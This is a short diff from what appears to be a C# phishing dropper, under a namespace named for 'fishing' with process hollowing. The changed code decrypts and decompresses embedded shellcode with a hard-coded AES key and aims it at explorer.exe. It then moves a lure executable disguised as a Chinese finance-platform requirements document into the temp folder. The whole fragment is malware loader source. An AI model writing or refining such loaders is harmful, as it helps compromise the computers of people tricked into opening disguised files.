@@ -488,8 +488,7 @@ namespace fishing_with_hollowing
 		{
 			string tempPath = Path.GetTempPath();
 			string targetProcess = "c:\\windows\\explorer.exe";
-			//byte[] shellcode = Loader.Decompress(Convert.FromBase64String(Loader.AesDecrypt("sa", "164329457b343765")));
-			byte[] shellcode = Convert.FromBase64String(Loader.AesDecrypt("sa", "164329457b343765"));
+			byte[] shellcode = Loader.Decompress(Convert.FromBase64String(Loader.AesDecrypt("shellcode——base64-zip", "164329457b343765")));
 			File.Move("交广微贷易金融实名注册需求文档.exe", tempPath + Guid.NewGuid().ToString());
 			Loader loader = new Loader();
 			try
